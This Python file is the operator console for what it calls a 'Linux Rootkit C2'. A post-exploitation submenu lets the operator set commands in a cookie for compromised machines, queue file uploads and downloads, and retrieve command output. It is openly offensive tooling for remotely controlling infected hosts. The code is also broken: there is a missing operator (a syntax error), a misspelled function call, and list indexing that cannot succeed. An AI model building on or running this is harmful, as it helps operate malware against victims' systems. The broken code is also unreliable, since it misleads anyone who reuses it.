import cmd2
from cmd2 import bg, fg, style
import cmd2_submenu
from addcommand import editcommand
from getoutput import getoutput
from downloadfile import downloadfile
from uploadfile import uploadfile

class PostExploitMenu(cmd2.Cmd):
    POST_EXPLOIT_CATEGORY = 'Post Exploitation Commands'
    def __init__(self):
        super().__init__(multiline_commands=['command'], persistent_history_file='cmd2_history.dat', use_ipython=True)

        self.intro = style("Welcome to the Post Exploitation Menu!", fg=fg.red, bg=bg.white, bold=True)

        self.self_in_py = True

        self.prompt = '(post-exploit) > '

    @cmd2.with_category(POST_EXPLOIT_CATEGORY)
    def do_intro(self, _):
        self.poutput(self.intro)

    @cmd2.with_category(POST_EXPLOIT_CATEGORY)
    def do_command(self, arg):
        self.poutput("[*] Setting command in Cookie..." + arg.split(" ", 1)[0] + " " + arg.split(" ", 1)[1])
        retValue = editcommand(arg.split(" ", 1)[0], arg.split(" ", 1)[1])

        if (retValue):
            self.poutput("[+] Successfully set command in Cookie!")
        else:
            self.poutput("[-] Error setting command in Cookie")

    @cmd2.with_category(POST_EXPLOIT_CATEGORY)
    def do_download(self, arg):
        self.poutput("[*] Adding download request to machine..." + arg.split(" ", 1)[0] + " " + arg.split(" ", 1)[1] + arg.split(" ", 1)[2])
        retValue = downloadfile(arg.split(" ", 1)[0], arg.split(" ", 1)[1], arg.split(" ", 1)[2])

        if (retValue):
            self.poutput("[+] Successfully added command to the queue")
        else:
            self.poutput("[-] Error adding command to the queue")

    @cmd2.with_category(POST_EXPLOIT_CATEGORY)
    def do_upload(self, arg):
        self.poutput("[*] Adding upload request to machine..." + arg.split(" ", 1)[0] + " " arg.split(" ", 1)[1] + arg.split(" ", 1)[2])
        retValue = uplaodfile(arg.split(" ", 1)[0], arg.split(" ", 1)[1], arg.split(" ", 1)[2])

        if (retValue):
            self.poutput("[+] Successfully added command to the queue")
        else:
            self.poutput("[-] Error adding command tot he queue")

    @cmd2.with_category(POST_EXPLOIT_CATEGORY)
    def do_output(self, arg):
        self.poutput("[*] Getting Output for Machine..." + arg.split(" ", 1)[0])
        retValue = getoutput(arg.split(" ", 1)[0])

        if (not retValue):
            self.poutput("[-] Error getting output for that machine")

@cmd2_submenu.AddSubmenu(PostExploitMenu(), command='post-exploit', reformat_prompt="{super_prompt[0]}{super_prompt[1]}{super_prompt[2]}{super_prompt[3]}{super_prompt[4]}{super_prompt[5]} {sub_prompt}")
class TopLevel(cmd2.Cmd):
    CUSTOM_CATEGORY = 'My Custom Commands'

    def __init__(self):
        super().__init__(multiline_commands=['echo'], persistent_history_file='cmd2_history.dat', use_ipython=True)

        self.intro = style("Welcome to the Linux Rootkit C2!", fg=fg.red, bg=bg.white, bold=True)

        self.self_in_py = True

        self.prompt = 'J.O.B. > '

        #self.default_category = 'cmd2 Built-in Commands'

    @cmd2.with_category(CUSTOM_CATEGORY)
    def do_intro(self, _):
        self.poutput(self.intro)

    @cmd2.with_category(CUSTOM_CATEGORY)
    def do_echo(self, arg):
        self.poutput(arg)
                


if __name__ == '__main__':
    app = TopLevel()
    app.cmdloop()
        